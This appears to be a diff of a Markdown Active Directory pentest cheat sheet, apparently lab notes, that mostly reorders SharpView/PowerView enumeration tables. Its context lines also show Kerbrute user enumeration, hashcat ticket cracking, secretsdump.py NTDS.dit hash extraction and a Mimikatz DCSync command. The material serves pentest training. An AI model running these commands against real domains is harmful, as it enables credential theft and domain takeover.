@@ -4530,171 +4530,6 @@ dir /b/s "<FILE>"
 | `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
 | `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |
 
-### SharpView/Powerview Cheatsheet 
-
- | Command | Description |
-|--------|-------------|
-| `Get-DomainPolicy` | View the domain password policy |
-| `.\SharpView.exe ConvertTo-SID -Name sally.jones` | Convert a username to a SID |
-| `.\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724` | Convert a SID to a username |
-| `Get-DomainUser harry.jones \| ConvertFrom-UACValue -showall` | List all UAC values |
-| `.\SharpView.exe Get-Domain` | View information about the current domain |
-| `.\SharpView.exe Get-DomainOU` | List all OUs |
-| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired` | Find ASREPRoastable users |
-| `Get-DomainComputer` | Get a listing of domain computers |
-| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | List all GPO names |
-| `Get-DomainGPO -ComputerIdentity WS01` | List GPOs on a specific host |
-| `Test-AdminAccess -ComputerName SQL01` | Test local admin access on a remote host |
-| `.\SharpView.exe Get-NetShare -ComputerName SQL01` | Enumerate open shares on a remote computer |
-| `Find-DomainUserLocation` | Find machines where domain users are logged in |
-| `Get-DomainTrust` | View a list of domain trusts |
-| `(Get-DomainUser).count` | Count all domain users |
-| `.\SharpView.exe Get-DomainUser -Help` | Get help about a SharpView function |
-| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Find non-blank user description fields |
-| `.\SharpView.exe Get-DomainUser -SPN` | Find users with SPNs set |
-| `Find-ForeignGroup` | Find foreign domain users |
-| `Get-DomainGroup -Properties Name` | List domain groups |
-| `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'` | Get members of a domain group |
-| `.\SharpView.exe Get-DomainGroup -AdminCount` | List protected groups |
-| `.\SharpView.exe Find-ManagedSecurityGroups` | List managed security groups |
-| `Get-NetLocalGroup -ComputerName WS01` | Get local groups on a host |
-| `.\SharpView.exe Get-NetLocalGroupMember -ComputerName HOST -GroupName GROUP` | Get members of a local group |
-| `.\SharpView.exe Get-DomainComputer -Unconstrained` | Find computers that allow unconstrained delegation |
-| `Get-DomainComputer -TrustedToAuth` | Find computers set with constrained delegation |
-| `Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol \| Export-Csv .\DOMAIN_computers.csv -NoTypeInformation`| gather is the hostname, operating system, and User Account Control (UAC) attributes|
-| `.\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol`||
-| `.\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol`| Get any computers within domain which allow unconstrained delegation (allows a service to request access to any other service on behalf of a user, without requiring additional authentication) |
-| `Get-DomainComputer -TrustedToAuth \| select -Property dnshostname,useraccountcontrol`|Get any computer with contrained delegration. (Impersonate specific SPNs) |
-| `Get-DomainObjectAcl -Identity harry.jones` | Enumerate ACLs on a user |
-| `Find-InterestingDomainAcl` | Find objects in the domain with modification rights over non built-in objects |
-| `Get-PathAcl "\\SQL01\DB_backups"` | Find the ACLs set on a directory |
-| `gpresult /r /S WS01` | Get a report of all GPOs applied to a host |
-| `Get-DomainGPO \| Get-ObjectAcl` | Find GPO permissions |
-| `Get-DomainTrustMapping` | Enumerate trusts for our domain/reachable domains |
-
-```
-Check all hosts that a given user has local admin access.  
-$sid = Convert-NameToSid harry.jones
-$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname
-foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}
-```
-
-
-
-#### Domain/LDAP Functions
-
-| Command | Description |
-|--------|-------------|
-| `Get-DomainDNSZone` | Enumerates the Active Directory DNS zones for a given domain |
-| `Get-DomainDNSRecord` | Enumerates the Active Directory DNS records for a given zone |
-| `Get-Domain` | Returns the domain object for the current (or specified) domain |
-| `Get-DomainController` | Returns the domain controllers for the current (or specified) domain |
-| `Get-Forest` | Returns the forest object for the current (or specified) forest |
-| `Get-ForestDomain` | Returns all domains for the current (or specified) forest |
-| `Get-ForestGlobalCatalog` | Returns all global catalogs for the current (or specified) forest |
-| `Find-DomainObjectPropertyOutlier` | Finds user/group/computer objects in AD that have 'outlier' properties set |
-| `Get-DomainUser` | Returns all users or specific user objects in AD |
-| `(Get-DomainUser).count` | Return count of how many users are in target domain |
-| `Get-DomainUser * -Domain DOMAIN \| Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol \| Export-Csv .\DOMAIN_users.csv -NoTypeInformation` | Enumerate all domain users and export to CSV |
-| `Get-DomainUser -SPN -Domain freightlogistics.local \| select samaccountname,memberof,serviceprincipalname \| fl`| Get users with Service Principal Names (SPNs) set in other domains that we can authenticate into via inbound or bi-directional trust relationships with forest-wide authentication allowing all users to authenticate across a trust or selective-authentication set up which allows specific users to authenticate.|
-|`Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local \| select samaccountname, pwdlastset, lastlogon \| Sort-Object -Property pwdlastset`| Get all users and sort by password last set|
-|`Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local \| select samaccountname, pwdlastset, lastlogon \| where { $_.pwdlastset -lt (Get-Date).addDays(-90) }`| Get all users with password set before certain date|
-| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof` | Obtain list of all users that do not require Kerberos pre-auth for ASREPRoast attack potential |
-| `.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof` | Get Kerberos constrained delegation users |
-| `.\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` | Get users that allow unconstrained delegation |
-| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Get users where description isn't blank |
-| `.\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname` | Get Service Principal Names (SPNs) which could be subjected to kerberoasting |
-| `Find-ForeignGroup` | Enumerate any users from other (foreign) domains with group membership within our domain |
-| `New-DomainUser` | Creates a new domain user (if permissions allow) and returns the user object |
-| `Set-DomainUserPassword` | Sets the password for a given user identity |
-| `Get-DomainUserEvent` | Enumerates account logon events (4624) and logon with explicit credential events |
-| `Get-DomainComputer` | Returns all computers or specific computer objects in AD |
-| `Get-DomainObject` | Returns all (or specified) domain objects in AD |
-| `Set-DomainObject` | Modifies a given property for a specified AD object |
-| `Get-DomainObjectAcl` | Returns the ACLs associated with a specific AD object |
-| `Add-DomainObjectAcl` | Adds an ACL for a specific AD object |
-| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights to non-built-ins |
-| `Get-DomainOU` | Searches for all or specific organizational units (OUs) in AD |
-| `.\SharpView.exe Get-DomainOU \| findstr /b "name"` | Return name of all OUs by name field |
-| `Get-DomainSite` | Searches for all sites or specific site objects in AD |
-| `Get-DomainSubnet` | Searches for all subnets or specific subnet objects in AD |
-| `Get-DomainSID` | Returns the SID for the current or specified domain |
-| `Get-DomainGroup` | Returns all groups or specific group objects in AD |
-| `New-DomainGroup` | Creates a new domain group (if permissions allow) |
-| `Get-DomainManagedSecurityGroup` | Returns all security groups in domain with a manager set |
-| `Get-DomainGroupMember` | Returns the members of a domain group |
-| `Add-DomainGroupMember` | Adds a user or group to an existing domain group |
-| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
-| `Get-DomainDFSShare` | Returns all DFS shares for the domain |
-| `Find-ManagedSecurityGroups \| select GroupName`| Returns managed security groups. Groups have non-administrators the right to add members to AD security groups and distro groups and is set by modifiying the managedBy attribute. |
-| `Get-DomainManagedSecurityGroup`| Returns all Domain Managed Security Groups  |
-| `Get-DomainObjectAcl -Identity 'Security Operations' \| ?{ $_.SecurityIdentifier -eq $sid}`|  |
-
-
-#### GPO Functions
-
-| Command | Description |
-|--------|-------------|
-| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD |
-| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | Return all GPO displaynames |
-| `Get-DomainGPO -ComputerIdentity WS01 \| select displayname` | Find GPO assigned to specific host |
-| `Get-DomainGPOLocalGroup` | Lists GPOs that modify local group memberships |
-| `Get-DomainGPOUserLocalGroupMapping` | Maps users/groups to local groups via GPO correlation |
-| `Get-DomainGPOComputerLocalGroupMapping` | Maps computers to local group memberships via GPO correlation |
-| `Get-DomainPolicy` | Returns the default or domain controller policy |
-
-#### Computer Enumeration 
-
-The computer enumeration functions can gather information about user sessions, test for local admin access, search for file shares and interesting files. 
-
-
-| Command | Description |
-|--------|-------------|
-| `Get-NetLocalGroup` | Lists local groups on the local/remote machine |
-| `Get-NetLocalGroupMember` | Lists members of a local group |
-| `.\SharpView.exe Get-NetShare -ComputerName DC01` | Enumerate open shares on remote machine |
-| `Get-NetShare` | Lists open shares on the local/remote machine |
-| `Get-NetLoggedon` | Lists users logged on the local/remote machine |
-| `Get-NetSession` | Lists sessions on the local/remote machine |
-| `Get-RegLoggedOn` | Enumerates logged-on users via remote registry |
-| `Get-NetRDPSession` | Gets RDP/session info from the local/remote machine |
-| `Test-AdminAccess` | Tests local admin access on local/remote machine |
-| `Test-AdminAccess -ComputerName SQL01` | Tests local admin access on remote machine |
-| `Get-NetComputerSiteName` | Gets the AD site of a computer |
-| `Get-WMIRegProxy` | Gets proxy settings and WPAD config |
-| `Get-WMIRegLastLoggedOn` | Gets the last logged on user |
-| `Get-WMIRegCachedRDPConnection` | Gets cached RDP connection info |
-| `Get-WMIRegMountedDrive` | Gets mounted network drives |
-| `Get-WMIProcess` | Lists running processes and owners |
-| `Find-InterestingFile` | Searches for files matching specific criteria |
-
-#### Domain Meta Functions
-
-The 'meta' functions can be used to find where domain users are logged in, look for specific processes on remote hosts, find domain shares, find files on domain shares, and test where our current user has local admin rights.
-
-| Command | Description |
-|--------|-------------|
-| `Find-DomainUserLocation` | Finds where specific domain users are logged in |
-| `Find-DomainProcess` | Finds machines where specific processes are running |
-| `Find-DomainUserEvent` | Finds logon events for specific users |
-| `Find-DomainShare` | Finds reachable shares on domain machines |
-| `Find-InterestingDomainShareFile` | Searches shares for interesting files |
-| `Find-LocalAdminAccess` | Finds machines where user has local admin rights |
-| `Find-DomainLocalGroupMember` | Enumerates members of local groups on domain machines |
-
-
-#### Trusts & Inter-Domain Enumeration 
-
-The domain trust functions provide us with the tools we need to enumerate information that can be used to mount cross-trust attacks. 
-
-| Command | Description |
-|--------|-------------|
-| `Get-DomainTrust` | Returns all domain trusts |
-| `Get-ForestTrust` | Returns all forest trusts |
-| `Get-DomainForeignUser` | Lists foreign users in local groups |
-| `Get-DomainForeignGroupMember` | Lists foreign group members |
-| `Get-DomainTrustMapping` | Recursively enumerates reachable domain trusts |
-
 ### LLMNR/NTB-NS Poisoning 
 
 | Command | Description |
@@ -4857,9 +4692,159 @@ The domain trust functions provide us with the tools we need to enumerate inform
 | `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host. |
 
 
+### SharpView/Powerview Cheatsheet 
+
+ | Command | Description |
+|--------|-------------|
+| `Get-DomainPolicy` | View the domain password policy |
+| `.\SharpView.exe ConvertTo-SID -Name sally.jones` | Convert a username to a SID |
+| `.\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724` | Convert a SID to a username |
+| `Get-DomainUser harry.jones \| ConvertFrom-UACValue -showall` | List all UAC values |
+| `.\SharpView.exe Get-Domain` | View information about the current domain |
+| `.\SharpView.exe Get-DomainOU` | List all OUs |
+| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired` | Find ASREPRoastable users |
+| `Get-DomainComputer` | Get a listing of domain computers |
+| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | List all GPO names |
+| `Get-DomainGPO -ComputerIdentity WS01` | List GPOs on a specific host |
+| `Test-AdminAccess -ComputerName SQL01` | Test local admin access on a remote host |
+| `.\SharpView.exe Get-NetShare -ComputerName SQL01` | Enumerate open shares on a remote computer |
+| `Find-DomainUserLocation` | Find machines where domain users are logged in |
+| `Get-DomainTrust` | View a list of domain trusts |
+| `(Get-DomainUser).count` | Count all domain users |
+| `.\SharpView.exe Get-DomainUser -Help` | Get help about a SharpView function |
+| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Find non-blank user description fields |
+| `.\SharpView.exe Get-DomainUser -SPN` | Find users with SPNs set |
+| `Find-ForeignGroup` | Find foreign domain users |
+| `Get-DomainGroup -Properties Name` | List domain groups |
+| `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'` | Get members of a domain group |
+| `.\SharpView.exe Get-DomainGroup -AdminCount` | List protected groups |
+| `.\SharpView.exe Find-ManagedSecurityGroups` | List managed security groups |
+| `Get-NetLocalGroup -ComputerName WS01` | Get local groups on a host |
+| `.\SharpView.exe Get-NetLocalGroupMember -ComputerName HOST -GroupName GROUP` | Get members of a local group |
+| `.\SharpView.exe Get-DomainComputer -Unconstrained` | Find computers that allow unconstrained delegation |
+| `Get-DomainComputer -TrustedToAuth` | Find computers set with constrained delegation |
+| `Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol \| Export-Csv .\DOMAIN_computers.csv -NoTypeInformation`| gather is the hostname, operating system, and User Account Control (UAC) attributes|
+| `.\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol`||
+| `.\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol`| Get any computers within domain which allow unconstrained delegation (allows a service to request access to any other service on behalf of a user, without requiring additional authentication) |
+| `Get-DomainComputer -TrustedToAuth \| select -Property dnshostname,useraccountcontrol`|Get any computer with contrained delegration. (Impersonate specific SPNs) |
+| `Get-DomainObjectAcl -Identity harry.jones` | Enumerate ACLs on a user |
+| `Find-InterestingDomainAcl` | Find objects in the domain with modification rights over non built-in objects |
+| `Get-PathAcl "\\SQL01\DB_backups"` | Find the ACLs set on a directory |
+| `gpresult /r /S WS01` | Get a report of all GPOs applied to a host |
+| `Get-DomainGPO \| Get-ObjectAcl` | Find GPO permissions |
+| `Get-DomainTrustMapping` | Enumerate trusts for our domain/reachable domains |
+
+```
+Check all hosts that a given user has local admin access.  
+$sid = Convert-NameToSid harry.jones
+$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname
+foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}
+```
 
 
-### ACL Enumeration & Tactics 
+
+#### Domain/LDAP Functions
+
+| Command | Description |
+|--------|-------------|
+| `Get-DomainDNSZone` | Enumerates the Active Directory DNS zones for a given domain |
+| `Get-DomainDNSRecord` | Enumerates the Active Directory DNS records for a given zone |
+| `Get-Domain` | Returns the domain object for the current (or specified) domain |
+| `Get-DomainController` | Returns the domain controllers for the current (or specified) domain |
+| `Get-Forest` | Returns the forest object for the current (or specified) forest |
+| `Get-ForestDomain` | Returns all domains for the current (or specified) forest |
+| `Get-ForestGlobalCatalog` | Returns all global catalogs for the current (or specified) forest |
+| `Find-DomainObjectPropertyOutlier` | Finds user/group/computer objects in AD that have 'outlier' properties set |
+| `Get-DomainUser` | Returns all users or specific user objects in AD |
+| `(Get-DomainUser).count` | Return count of how many users are in target domain |
+| `Get-DomainUser * -Domain DOMAIN \| Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol \| Export-Csv .\DOMAIN_users.csv -NoTypeInformation` | Enumerate all domain users and export to CSV |
+| `Get-DomainUser -SPN -Domain freightlogistics.local \| select samaccountname,memberof,serviceprincipalname \| fl`| Get users with Service Principal Names (SPNs) set in other domains that we can authenticate into via inbound or bi-directional trust relationships with forest-wide authentication allowing all users to authenticate across a trust or selective-authentication set up which allows specific users to authenticate.|
+|`Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local \| select samaccountname, pwdlastset, lastlogon \| Sort-Object -Property pwdlastset`| Get all users and sort by password last set|
+|`Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local \| select samaccountname, pwdlastset, lastlogon \| where { $_.pwdlastset -lt (Get-Date).addDays(-90) }`| Get all users with password set before certain date|
+| `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof` | Obtain list of all users that do not require Kerberos pre-auth for ASREPRoast attack potential |
+| `.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof` | Get Kerberos constrained delegation users |
+| `.\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"` | Get users that allow unconstrained delegation |
+| `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` | Get users where description isn't blank |
+| `.\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname` | Get Service Principal Names (SPNs) which could be subjected to kerberoasting |
+| `Find-ForeignGroup` | Enumerate any users from other (foreign) domains with group membership within our domain |
+| `New-DomainUser` | Creates a new domain user (if permissions allow) and returns the user object |
+| `Set-DomainUserPassword` | Sets the password for a given user identity |
+| `Get-DomainUserEvent` | Enumerates account logon events (4624) and logon with explicit credential events |
+| `Get-DomainComputer` | Returns all computers or specific computer objects in AD |
+| `Get-DomainObject` | Returns all (or specified) domain objects in AD |
+| `Set-DomainObject` | Modifies a given property for a specified AD object |
+| `Get-DomainObjectAcl` | Returns the ACLs associated with a specific AD object |
+| `Add-DomainObjectAcl` | Adds an ACL for a specific AD object |
+| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights to non-built-ins |
+| `Get-DomainOU` | Searches for all or specific organizational units (OUs) in AD |
+| `.\SharpView.exe Get-DomainOU \| findstr /b "name"` | Return name of all OUs by name field |
+| `Get-DomainSite` | Searches for all sites or specific site objects in AD |
+| `Get-DomainSubnet` | Searches for all subnets or specific subnet objects in AD |
+| `Get-DomainSID` | Returns the SID for the current or specified domain |
+| `Get-DomainGroup` | Returns all groups or specific group objects in AD |
+| `New-DomainGroup` | Creates a new domain group (if permissions allow) |
+| `Get-DomainManagedSecurityGroup` | Returns all security groups in domain with a manager set |
+| `Get-DomainGroupMember` | Returns the members of a domain group |
+| `Add-DomainGroupMember` | Adds a user or group to an existing domain group |
+| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
+| `Get-DomainDFSShare` | Returns all DFS shares for the domain |
+| `Find-ManagedSecurityGroups \| select GroupName`| Returns managed security groups. Groups have non-administrators the right to add members to AD security groups and distro groups and is set by modifiying the managedBy attribute. |
+| `Get-DomainManagedSecurityGroup`| Returns all Domain Managed Security Groups  |
+| `Get-DomainObjectAcl -Identity 'Security Operations' \| ?{ $_.SecurityIdentifier -eq $sid}`|  |
+
+
+#### GPO Functions
+
+| Command | Description |
+|--------|-------------|
+| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD |
+| `.\SharpView.exe Get-DomainGPO \| findstr displayname` | Return all GPO displaynames |
+| `Get-DomainGPO -ComputerIdentity WS01 \| select displayname` | Find GPO assigned to specific host |
+| `Get-DomainGPOLocalGroup` | Lists GPOs that modify local group memberships |
+| `Get-DomainGPOUserLocalGroupMapping` | Maps users/groups to local groups via GPO correlation |
+| `Get-DomainGPOComputerLocalGroupMapping` | Maps computers to local group memberships via GPO correlation |
+| `Get-DomainPolicy` | Returns the default or domain controller policy |
+
+#### Computer Enumeration 
+
+The computer enumeration functions can gather information about user sessions, test for local admin access, search for file shares and interesting files. 
+
+
+| Command | Description |
+|--------|-------------|
+| `Get-NetLocalGroup` | Lists local groups on the local/remote machine |
+| `Get-NetLocalGroupMember` | Lists members of a local group |
+| `.\SharpView.exe Get-NetShare -ComputerName DC01` | Enumerate open shares on remote machine |
+| `Get-NetShare` | Lists open shares on the local/remote machine |
+| `Get-NetLoggedon` | Lists users logged on the local/remote machine |
+| `Get-NetSession` | Lists sessions on the local/remote machine |
+| `Get-RegLoggedOn` | Enumerates logged-on users via remote registry |
+| `Get-NetRDPSession` | Gets RDP/session info from the local/remote machine |
+| `Test-AdminAccess` | Tests local admin access on local/remote machine |
+| `Test-AdminAccess -ComputerName SQL01` | Tests local admin access on remote machine |
+| `Get-NetComputerSiteName` | Gets the AD site of a computer |
+| `Get-WMIRegProxy` | Gets proxy settings and WPAD config |
+| `Get-WMIRegLastLoggedOn` | Gets the last logged on user |
+| `Get-WMIRegCachedRDPConnection` | Gets cached RDP connection info |
+| `Get-WMIRegMountedDrive` | Gets mounted network drives |
+| `Get-WMIProcess` | Lists running processes and owners |
+| `Find-InterestingFile` | Searches for files matching specific criteria |
+
+#### Domain Meta Functions
+
+The 'meta' functions can be used to find where domain users are logged in, look for specific processes on remote hosts, find domain shares, find files on domain shares, and test where our current user has local admin rights.
+
+| Command | Description |
+|--------|-------------|
+| `Find-DomainUserLocation` | Finds where specific domain users are logged in |
+| `Find-DomainProcess` | Finds machines where specific processes are running |
+| `Find-DomainUserEvent` | Finds logon events for specific users |
+| `Find-DomainShare` | Finds reachable shares on domain machines |
+| `Find-InterestingDomainShareFile` | Searches shares for interesting files |
+| `Find-LocalAdminAccess` | Finds machines where user has local admin rights |
+| `Find-DomainLocalGroupMember` | Enumerates members of local groups on domain machines |
+
+#### ACL Enumeration & Tactics 
 
 There are two types of ACLs 
 
@@ -4954,6 +4939,20 @@ The attack requires a user to be delegated a combination of the following three 
 | `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
 | `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
 | `mimikatz ## lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |
+
+
+#### Trusts & Inter-Domain Enumeration 
+
+The domain trust functions provide us with the tools we need to enumerate information that can be used to mount cross-trust attacks. 
+
+| Command | Description |
+|--------|-------------|
+| `Get-DomainTrust` | Returns all domain trusts |
+| `Get-ForestTrust` | Returns all forest trusts |
+| `Get-DomainForeignUser` | Lists foreign users in local groups |
+| `Get-DomainForeignGroupMember` | Lists foreign group members |
+| `Get-DomainTrustMapping` | Recursively enumerates reachable domain trusts |
+
 
 
 
